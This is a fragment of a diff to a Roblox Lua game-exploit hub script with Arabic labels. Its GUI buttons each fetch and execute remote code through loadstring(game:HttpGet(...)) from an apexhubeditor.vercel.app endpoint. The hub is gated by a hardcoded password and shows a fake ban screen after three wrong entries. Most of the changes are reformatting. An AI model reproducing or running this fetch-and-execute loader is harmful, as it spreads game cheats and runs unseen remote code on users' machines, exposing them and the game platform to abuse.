+    "اوتو كلكر",  
+    "اوتو كلكر",  
+    function()  
+        loadstring(game:HttpGet(  
+            "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_ah"  
+        ))()  
+    end  
+)  
 
-    local TabLag = Window:NewTab("nvو ازالة الاق")
-    local SecLag = TabLag:NewSection("nvو ازالة الاق")
+local TabLag = Window:NewTab("nvو ازالة الاق")  
+local SecLag = TabLag:NewSection("nvو ازالة الاق")  
 
-    SecLag:NewButton(
-        "nv",
-        "nv",
-        function()
-            loadstring(game:HttpGet(
-                "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_nv"
-            ))()
-        end
-    )
+SecLag:NewButton(  
+    "nv",  
+    "nv",  
+    function()  
+        loadstring(game:HttpGet(  
+            "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_nv"  
+        ))()  
+    end  
+)  
 
-    SecLag:NewButton(
-        "ازالة الاق",
-        "ازالة الاق",
-        function()
-            loadstring(game:HttpGet(
-                "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_jk"
-            ))()
-        end
-    )
+SecLag:NewButton(  
+    "ازالة الاق",  
+    "ازالة الاق",  
+    function()  
+        loadstring(game:HttpGet(  
+            "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_jk"  
+        ))()  
+    end  
+)  
 
-    local TabOldClan = Window:NewTab("السكربت القديم للكلان")
-    local SecOldClan = TabOldClan:NewSection("السكربت القديم للكلان")
+local TabOldClan = Window:NewTab("السكربت القديم للكلان")  
+local SecOldClan = TabOldClan:NewSection("السكربت القديم للكلان")  
 
-    SecOldClan:NewButton(
-        "السكربت القديم للكلان",
-        "تشغيل السكربت القديم للكلان",
-        function()
-            loadstring(game:HttpGet(
-                "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_shshs"
-            ))()
-        end
-    )
+SecOldClan:NewButton(  
+    "السكربت القديم للكلان",  
+    "تشغيل السكربت القديم للكلان",  
+    function()  
+        loadstring(game:HttpGet(  
+            "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_shshs"  
+        ))()  
+    end  
+)  
 
-    task.delay(1, function()
-        KavoGui = FindKavoGui()
-        if KavoGui then
-            MakeKavoDraggable(KavoGui)
-        end
-    end)
+task.delay(1, function()  
+    KavoGui = FindKavoGui()  
+    if KavoGui then  
+        MakeKavoDraggable(KavoGui)  
+    end  
+end)
+
 end
 
 local failedAttempts = 0
 local correctPassword = "NHYQONTOP1234"
 
 SubmitBtn.Activated:Connect(function()
-    if PassInput.Text == correctPassword then
-        PasswordFrame.Visible = false
-        SuccessCheck.Visible = true
-        task.wait(1.5)
-        SuccessCheck.Visible = false
-        ToggleBtn.Visible = true
+if PassInput.Text == correctPassword then
+PasswordFrame.Visible = false
+SuccessCheck.Visible = true
+task.wait(1.5)
+SuccessCheck.Visible = false
+ToggleBtn.Visible = true
 
-        WelcomeBanner.Position = UDim2.new(0, 0, 0, -75)
+WelcomeBanner.Position = UDim2.new(0, 0, 0, -75)  
 
-        TweenService:Create(
-            WelcomeBanner,
-            TweenInfo.new(
-                0.5,
-                Enum.EasingStyle.Quart,
-                Enum.EasingDirection.Out
-            ),
-            {
-                Position = UDim2.new(0, 0, 0, 0)
-            }
-        ):Play()
+    TweenService:Create(  
+        WelcomeBanner,  
+        TweenInfo.new(  
+            0.5,  
+            Enum.EasingStyle.Quart,  
+            Enum.EasingDirection.Out  
+        ),  
+        {  
+            Position = UDim2.new(0, 0, 0, 0)  
+        }  
+    ):Play()  
 
-        LoadMainScript()
+    LoadMainScript()  
 
-        task.wait(5)
+    task.wait(5)  
 
-        TweenService:Create(
-            WelcomeBanner,
-            TweenInfo.new(
-                0.5,
-                Enum.EasingStyle.Quart,
-                Enum.EasingDirection.In
-            ),
-            {
-                Position = UDim2.new(0, 0, 0, -75)
-            }
-        ):Play()
-    else
-        failedAttempts = failedAttempts + 1
-        PassInput.Text = ""
+    TweenService:Create(  
+        WelcomeBanner,  
+        TweenInfo.new(  
+            0.5,  
+            Enum.EasingStyle.Quart,  
+            Enum.EasingDirection.In  
+        ),  
+        {  
+            Position = UDim2.new(0, 0, 0, -75)  
+        }  
+    ):Play()  
+else  
+    failedAttempts = failedAttempts + 1  
+    PassInput.Text = ""  
 
-        local remaining = 3 - failedAttempts
+    local remaining = 3 - failedAttempts  
 
-        if remaining > 0 then
-            PassInput.PlaceholderText =
-                "خطأ! محاولات متبقية: " .. remaining
-        end
+    if remaining > 0 then  
+        PassInput.PlaceholderText =  
+            "خطأ! محاولات متبقية: " .. remaining  
+    end  
 
-        if failedAttempts >= 3 then
-            PasswordFrame.Visible = false
-            BanScreen.Visible = true
-        end
-    end
+    if failedAttempts >= 3 then  
+        PasswordFrame.Visible = false  
+        BanScreen.Visible = true  
+    end  
+end
+
 end)
-
